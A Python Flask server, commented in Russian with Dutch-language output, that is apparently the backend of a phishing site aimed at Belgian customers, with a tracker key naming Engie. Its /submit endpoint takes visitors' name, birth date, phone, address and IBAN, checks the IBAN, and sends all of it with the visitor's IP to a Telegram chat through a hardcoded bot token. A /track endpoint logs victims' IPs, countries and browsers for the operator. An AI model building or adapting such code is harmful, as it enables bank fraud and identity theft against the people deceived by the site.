# ============================================================
#  server.py — Flask-сервер с IBAN-валидатором
#  pip install flask requests gunicorn
#  python server.py
# ============================================================

import logging
import re
import json
import os
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory
import requests

# ===================== CONFIG =====================
BOT_TOKEN = "8641605812:AAHCdlRFCjVMJ0hByVsQYtLeifAEhObJO_8"
CHAT_ID   = "-5322959874"

# ---- Click Tracker ----
CLICKS_KEY  = os.environ.get("CLICKS_KEY", "engie-clicks-9f3a7c42-secret")
DATA_DIR    = os.environ.get("DATA_DIR", ".")
CLICKS_FILE = os.path.join(DATA_DIR, "clicks.json")
CLICKS_MAX  = 5000
# ==================================================

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# ============================================================
#  IBAN VALIDATION (ISO 13616 / MOD-97)
# ============================================================

IBAN_LENGTHS = {
    "AL": 28, "AD": 24, "AT": 20, "AZ": 28, "BH": 22, "BE": 16, "BA": 20,
    "BR": 29, "BG": 22, "CR": 22, "HR": 21, "CY": 28, "CZ": 24, "DK": 18,
    "DO": 28, "EE": 20, "FO": 18, "FI": 18, "FR": 27, "GE": 22, "DE": 22,
    "GI": 23, "GR": 27, "GL": 18, "GT": 28, "HU": 28, "IS": 26, "IE": 22,
    "IL": 23, "IT": 27, "JO": 30, "KZ": 20, "XK": 20, "KW": 30, "LV": 21,
    "LB": 28, "LI": 21, "LT": 20, "LU": 20, "MT": 31, "MR": 27, "MU": 30,
    "MD": 24, "MC": 27, "ME": 22, "NL": 18, "MK": 19, "NO": 15, "PK": 24,
    "PS": 29, "PL": 28, "PT": 25, "QA": 29, "RO": 24, "LC": 32, "SM": 27,
    "ST": 25, "SA": 24, "RS": 22, "SC": 31, "SK": 24, "SI": 19, "ES": 24,
    "SE": 24, "CH": 21, "TL": 23, "TN": 24, "TR": 26, "UA": 29, "AE": 23,
    "GB": 22, "VA": 22, "VG": 24, "BY": 28, "SV": 28, "IQ": 23, "LY": 25,
    "SD": 18, "BI": 27, "DJ": 27, "EG": 29, "FK": 18, "MN": 20, "NI": 32,
    "OM": 23, "RU": 33, "SO": 23, "YE": 30, "GQ": 27, "AO": 25, "BF": 28,
    "BJ": 28, "CI": 28, "CM": 27, "CV": 25, "DZ": 26, "GA": 27, "IR": 26,
    "MG": 27, "ML": 28, "MZ": 25, "SN": 28, "TD": 27, "TG": 28, "KM": 27,
    "CG": 27, "CD": 27, "CF": 27, "HN": 28, "PY": 28, "BO": 22, "AR": 22,
    "CO": 24, "EC": 24, "PE": 24, "UY": 23, "VE": 24, "PA": 24, "CL": 24,
    "MX": 18,
}

_LETTER_MAP = {chr(65 + i): str(10 + i) for i in range(26)}


def _mod97(numeric_string: str) -> int:
    remainder = 0
    for ch in numeric_string:
        remainder = (remainder * 10 + int(ch)) % 97
    return remainder


def validate_iban(iban_raw: str):
    if not iban_raw:
        return False, "Пустой IBAN"

    iban = re.sub(r"[\s\-]", "", str(iban_raw)).upper()

    # без страны, 14 символов → BE
    if len(iban) == 14 and iban.isalnum() and not iban[:2].isalpha():
        iban = "BE" + iban

    if len(iban) < 4:
        return False, "Слишком короткий"

    country = iban[:2]
    if not country.isalpha():
        return False, "Первые 2 символа — код страны"

    expected_len = IBAN_LENGTHS.get(country)
    if expected_len is None:
        return False, f"Неизвестный код страны: {country}"

    if len(iban) != expected_len:
        return False, f"Неверная длина для {country}: {len(iban)}, ожидается {expected_len}"

    if not iban[4:].isdigit():
        return False, "После кода страны и контрольных цифр — только цифры"

    rearranged = iban[4:] + iban[:4]
    numeric_str = "".join(ch if ch.isdigit() else _LETTER_MAP[ch] for ch in rearranged)

    if _mod97(numeric_str) != 1:
        return False, "Не пройдена проверка контрольной суммы (mod-97)"

    return True, f"Валиден ({country})"


def format_iban(iban_raw: str) -> str:
    clean = re.sub(r"[\s\-]", "", str(iban_raw)).upper()
    return " ".join(clean[i:i+4] for i in range(0, len(clean), 4))


# ============================================================


# ============================================================
#  CLICK TRACKER — storage
# ============================================================
def load_clicks():
    if not os.path.exists(CLICKS_FILE):
        return []
    try:
        with open(CLICKS_FILE, "r", encoding="utf-8") as f:
            return json.load(f) or []
    except Exception:
        return []


def save_clicks(clicks):
    if len(clicks) > CLICKS_MAX:
        clicks = clicks[-CLICKS_MAX:]
    with open(CLICKS_FILE, "w", encoding="utf-8") as f:
        json.dump(clicks, f, ensure_ascii=False, indent=2)


def _cors(resp):
    resp.headers["Access-Control-Allow-Origin"]  = "*"
    resp.headers["Access-Control-Allow-Headers"] = "Content-Type"
    resp.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    return resp


def send_to_telegram(text: str) -> bool:
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }
    try:
        r = requests.post(url, json=payload, timeout=10)
        r.raise_for_status()
        return True
    except Exception as e:
        logging.exception("Telegram send failed: %s", e)
        return False


# ============================================================
#  HEALTH-CHECK для UptimeRobot
# ============================================================
@app.route("/", methods=["GET", "HEAD"])
@app.route("/health", methods=["GET", "HEAD"])
def health():
    return "OK", 200


# ============================================================
#  CLICK TRACKER — приём кликов
# ============================================================
@app.route("/track", methods=["POST", "OPTIONS"])
def track():
    if request.method == "OPTIONS":
        return _cors(jsonify({"ok": True}))

    data = request.get_json(silent=True) or {}
    name  = str(data.get("name", ""))[:100]
    extra = str(data.get("extra", ""))[:200]
    ua    = str(data.get("ua", ""))[:400]
    ref   = str(data.get("ref", ""))[:300]
    lang  = str(data.get("lang", ""))[:10]
    scr   = str(data.get("screen", ""))[:20]

    ip = request.headers.get("X-Forwarded-For", request.remote_addr or "")
    if "," in ip:
        ip = ip.split(",")[0].strip()

    country = request.headers.get("CF-IPCountry", "") or request.headers.get("X-Country", "")

    clicks = load_clicks()
    clicks.append({
        "ts": datetime.now().strftime("%d.%m.%Y, %H:%M:%S"),
        "name": name,
        "extra": extra,
        "ip": ip,
        "country": country,
        "ua": ua,
        "ref": ref,
        "lang": lang,
        "screen": scr,
    })
    save_clicks(clicks)

    return _cors(jsonify({"ok": True, "total": len(clicks)}))


# ============================================================
#  CLICK STATS — страница и API
# ============================================================
@app.route("/stats", methods=["GET"])
def stats_page():
    key = request.args.get("key", "")
    if key != CLICKS_KEY:
        return "Not Found", 404
    return send_from_directory(".", "stats.html")


@app.route("/stats/api", methods=["GET", "OPTIONS"])
def stats_api():
    if request.method == "OPTIONS":
        return _cors(jsonify({"ok": True}))

    key = request.args.get("key", "")
    if key != CLICKS_KEY:
        return _cors(jsonify({"ok": False, "error": "forbidden"})), 403

    clicks = load_clicks()

    by_name    = {}
    by_ip      = {}
    by_country = {}
    by_browser = {}

    for c in clicks:
        n = c.get("name", "unknown")
        by_name[n] = by_name.get(n, 0) + 1

        ip = c.get("ip", "")
        if ip:
            by_ip[ip] = by_ip.get(ip, 0) + 1

        cc = c.get("country", "") or "?"
        by_country[cc] = by_country.get(cc, 0) + 1

        ua = (c.get("ua", "") or "").lower()
        if "opera" in ua or "opr" in ua:
            b = "Opera"
        elif "edg" in ua:
            b = "Edge"
        elif "chrome" in ua:
            b = "Chrome"
        elif "firefox" in ua:
            b = "Firefox"
        elif "safari" in ua:
            b = "Safari"
        elif "telegram" in ua:
            b = "Telegram"
        else:
            b = "Other"
        by_browser[b] = by_browser.get(b, 0) + 1

    last = clicks[-200:][::-1]

    return _cors(jsonify({
        "ok": True,
        "total": len(clicks),
        "by_name": by_name,
        "by_ip": by_ip,
        "by_country": by_country,
        "by_browser": by_browser,
        "last": last,
    }))


@app.route("/stats/clear", methods=["POST", "OPTIONS"])
def stats_clear():
    if request.method == "OPTIONS":
        return _cors(jsonify({"ok": True}))
    key = request.args.get("key", "")
    if key != CLICKS_KEY:
        return _cors(jsonify({"ok": False, "error": "forbidden"})), 403
    save_clicks([])
    return _cors(jsonify({"ok": True}))


# ============================================================
#  ОСНОВНОЙ ЭНДПОИНТ
# ============================================================
@app.route("/submit", methods=["POST", "OPTIONS"])
def submit():
    if request.method == "OPTIONS":
        resp = jsonify({"ok": True})
        resp.headers["Access-Control-Allow-Origin"] = "*"
        resp.headers["Access-Control-Allow-Headers"] = "Content-Type"
        resp.headers["Access-Control-Allow-Methods"] = "POST, OPTIONS"
        return resp

    data = request.get_json(silent=True) or {}

    fio      = str(data.get("fio", "")).strip()
    dob      = str(data.get("dob", "")).strip()
    phone    = str(data.get("phone", "")).strip()
    stad     = str(data.get("stad", "")).strip()
    straat   = str(data.get("straat", "")).strip()
    postcode = str(data.get("postcode", "")).strip()
    iban_raw = str(data.get("iban", "")).strip().upper().replace(" ", "")

    # если сайт не прислал BE — добавим
    if not iban_raw.startswith("BE") and len(iban_raw) == 14 and iban_raw.isalnum():
        iban_raw = "BE" + iban_raw

    is_valid, reason = validate_iban(iban_raw)
    iban_formatted   = format_iban(iban_raw)
    status_icon      = "✅" if is_valid else "❌"
    status_text      = "VALID / Активен" if is_valid else f"INVALID / Неактивен — {reason}"

    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "")

    text = (
        "🟡 <b>Nieuwe aanvraag / Новая заявка</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>Naam:</b> {fio}\n"
        f"🎂 <b>Geboortedatum:</b> {dob}\n"
        f"📱 <b>Telefoon:</b> {phone}\n"
        f"🏙 <b>Stad:</b> {stad}\n"
        f"🏠 <b>Straat:</b> {straat}\n"
        f"📮 <b>Postcode:</b> {postcode}\n"
        f"🏦 <b>IBAN:</b> <code>{iban_formatted}</code>\n"
        f"{status_icon} <b>IBAN статус:</b> {status_text}\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"🌐 <b>IP:</b> <code>{ip}</code>\n"
        f"🖥 <b>UA:</b> {ua[:120]}"
    )

    ok = send_to_telegram(text)

    resp = jsonify({"ok": ok, "iban_valid": is_valid, "reason": reason})
    resp.headers["Access-Control-Allow-Origin"] = "*"
    return resp, (200 if ok else 500)


if __name__ == "__main__":
    logging.info("Clicks file: %s", os.path.abspath(CLICKS_FILE))
    logging.info("Clicks key: %s", CLICKS_KEY)
    app.run(host="0.0.0.0", port=8080, debug=False)
